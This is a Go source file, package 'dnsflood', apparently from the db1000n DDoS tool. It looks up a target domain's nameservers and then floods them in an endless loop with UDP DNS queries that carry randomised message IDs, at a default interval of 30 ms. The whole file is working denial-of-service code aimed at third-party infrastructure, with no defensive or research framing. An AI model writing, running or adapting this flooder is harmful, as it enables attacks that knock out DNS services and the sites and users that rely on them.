package dnsflood

import (
	"github.com/Arriven/db1000n/src/logs"
	"github.com/miekg/dns"
	"math/rand"
	"net"
	"time"
)

type Config struct {
	Verbose       bool
	Iterative     bool
	RootDomain    string   `json:"root_domain"`
	TargetDomains []string `json:"target_domains"`
	IntervalMs    int
}
type DnsStress struct {
	Logger      *logs.Logger
	Config      *Config
	Nameservers []string
}

func setDefaults(c *Config) {
	if c.IntervalMs == 0 {
		c.IntervalMs = 30
	}
	// all remaining parameters are treated as domains to be used in round-robin in the threads
	for i, element := range c.TargetDomains {
		if element[len(element)-1] != '.' {
			c.TargetDomains[i] = element + "."
		}
	}
}

func Start(stopChan chan bool, logger *logs.Logger, config *Config) error {
	setDefaults(config)

	nameservers, err := getNameservers(config.RootDomain)
	if err != nil {
		logger.Error("Unable to parse the nameserver address for domain %s, %w", config.RootDomain, err)
	}

	s := &DnsStress{
		Logger:      logger,
		Config:      config,
		Nameservers: nameservers,
	}

	if err != nil {
		logger.Error("Unable to parse the nameserver address, %w", err)
		return err
	}

	logger.Info("Stressing nameservers for domain: %s.", config.RootDomain)
	logger.Info("Target domains: %v.", config.TargetDomains)

	go s.Stress(stopChan, config.TargetDomains, config.IntervalMs)

	return nil
}

func (s DnsStress) Stress(stopChan chan bool, domains []string, intervalMs int) {
	messages := make([]*dns.Msg, len(domains))
	for i, d := range domains {
		message := new(dns.Msg).SetQuestion(d, dns.TypeA)
		if s.Config.Iterative {
			message.RecursionDesired = false
		}
		messages[i] = message
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			randomNameserver := s.Nameservers[rand.Intn(len(s.Nameservers))]
			sendMessages(randomNameserver, messages)
		}
		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
	}
}

func sendMessages(nameserver string, messages []*dns.Msg) {
	dnsConn, _ := net.Dial("udp", nameserver+":53")
	co := &dns.Conn{Conn: dnsConn}
	for _, message := range messages {
		newId := rand.Intn(65536)
		message.Id = uint16(newId)
		_ = co.WriteMsg(message)
	}
	defer co.Close()
}

func getNameservers(rootDomain string) (res []string, err error) {
	nameservers, err := net.LookupNS(rootDomain)
	if err != nil {
		return nil, err
	}
	for _, nameserver := range nameservers {
		res = append(res, nameserver.Host)
	}
	return res, nil
}
